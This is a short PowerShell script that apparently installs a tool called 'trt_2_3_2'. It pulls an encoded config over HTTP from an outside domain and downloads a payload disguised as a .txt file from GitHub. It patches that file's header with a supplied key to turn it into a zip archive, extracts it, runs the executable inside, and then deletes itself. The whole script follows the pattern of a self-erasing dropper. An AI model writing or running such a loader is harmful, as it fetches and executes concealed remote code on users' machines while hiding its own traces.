Set-ExecutionPolicy RemoteSigned -Scope Process -Force

function LoadVars {
    $_vars_url = "http://dexter-base.link/vars"
    $_s = (Invoke-WebRequest -Uri $_vars_url).Content
    $_j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_s))
    $global:_vars = $_j | ConvertFrom-Json
}

function Vars ($key) {
    return $global:_vars.$key
}

$repo = "https://raw.githubusercontent.com/dexterdreeeam/HelpScript/main/"
$binName = "trt_2_3_2.txt"
$binUrl = "$repo/TRT/$binName"
$binPath = Join-Path -Path $pwd -ChildPath $binName
$trtZipPath = Join-Path -Path $pwd -ChildPath "_trt.zip"
$trtFolderPath = Join-Path -Path $env:USERPROFILE -ChildPath "trt_2_3_2"
$trtExePath = Join-Path -Path $trtFolderPath -ChildPath (Vars("trtExeFilePath"))
$code = $args[0]

function MainEntry {
    if ($null -eq $code) {
        Write-Error "No decryption code provided"
        exit 1
    }
    $replace = [System.Text.Encoding]::ASCII.GetBytes($code)

    if (-not (Test-Path $trtFolderPath -PathType Container)) {
        Remove-Item -Path $trtZipPath -ErrorAction SilentlyContinue
        Invoke-WebRequest -Uri $binUrl -OutFile $binPath

        $stream = [System.IO.File]::Open(
            $binPath,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::ReadWrite)
        $stream.Position = 0
        $stream.Write($replace, 0, $replace.Length)
        $stream.Flush()
        $stream.Close()
        Start-Sleep -Seconds 3

        Rename-Item -Path $binPath -NewName $trtZipPath
        Expand-Archive -Path $trtZipPath -DestinationPath $trtFolderPath
        Start-Sleep -Seconds 3
    } else {
        Write-Host "Trt already exists."
    }

    Start-Process -FilePath $trtExePath
}

try {
    LoadVars
    MainEntry
}
catch {
    Write-Host "Exception:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.Exception.StackTrace -ForegroundColor Red
    exit 1
}

# Delete Self
$myPsPath = $MyInvocation.MyCommand.Path
Start-Process powershell -ArgumentList "Remove-Item `"$myPsPath`" -Force"
